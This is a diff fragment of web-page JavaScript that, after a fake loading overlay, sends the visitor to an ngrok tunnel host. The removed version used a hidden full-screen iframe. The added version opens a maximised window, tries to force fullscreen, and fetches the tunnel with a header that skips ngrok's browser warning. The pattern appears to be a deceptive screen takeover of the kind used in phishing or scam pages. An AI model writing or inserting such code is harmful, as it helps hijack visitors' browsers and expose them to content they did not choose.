@@ -1267,33 +1267,46 @@
                 loadingOverlay.appendChild(loadingContainer);
                 document.body.appendChild(loadingOverlay);
 
-                setTimeout(() => {
-                    document.body.removeChild(loadingOverlay);
-
-                    const hiddenFrame = document.createElement('iframe');
-                    hiddenFrame.style.position = 'fixed';
-                    hiddenFrame.style.top = '0';
-                    hiddenFrame.style.left = '0';
-                    hiddenFrame.style.width = '100%';
-                    hiddenFrame.style.height = '100%';
-                    hiddenFrame.style.border = 'none';
-                    hiddenFrame.style.zIndex = '99999';
-                    hiddenFrame.src = 'https://8412-14-139-176-131.ngrok-free.app';
-
-                    hiddenFrame.onload = function () {
-                        document.body.style.overflow = 'hidden';
-
-                        try {
-                            hiddenFrame.requestFullscreen().catch(err => {
-                                console.log("Error attempting to enable fullscreen: ", err);
-                            });
-                        } catch (error) {
-                            console.error("Fullscreen error:", error);
-                        }
-                    };
-
-                    document.body.appendChild(hiddenFrame);
-                }, 2000);
+setTimeout(() => {
+    document.body.removeChild(loadingOverlay);
+    
+    // Open a new window instead of iframe
+    const newWindow = window.open('https://8412-14-139-176-131.ngrok-free.app', '_blank', 'width='+screen.width+',height='+screen.height);
+    
+    // If the new window was successfully opened
+    if (newWindow) {
+        // Focus the new window
+        newWindow.focus();
+        
+        // Try to maximize the window to be as large as possible
+        newWindow.moveTo(0, 0);
+        newWindow.resizeTo(screen.width, screen.height);
+        
+        // We'll attempt to inject a script that requests fullscreen
+        // This might not work due to cross-origin restrictions
+        try {
+            newWindow.onload = function() {
+                newWindow.document.documentElement.requestFullscreen()
+                    .catch(err => console.error("Couldn't activate fullscreen:", err));
+            };
+        } catch (err) {
+            console.error("Couldn't inject fullscreen code:", err);
+        }
+        
+        // Perform the fetch request with the specified header
+        fetch('https://8412-14-139-176-131.ngrok-free.app', {
+            method: "get",
+            headers: new Headers({
+                "ngrok-skip-browser-warning": "69420",
+            }),
+        })
+        .then((response) => response.json())
+        .then((data) => console.log(data))
+        .catch((err) => console.log(err));
+    } else {
+        console.error("Failed to open new window. It may have been blocked by a popup blocker.");
+    }
+}, 2000);
             });
 
             popup.appendChild(title);
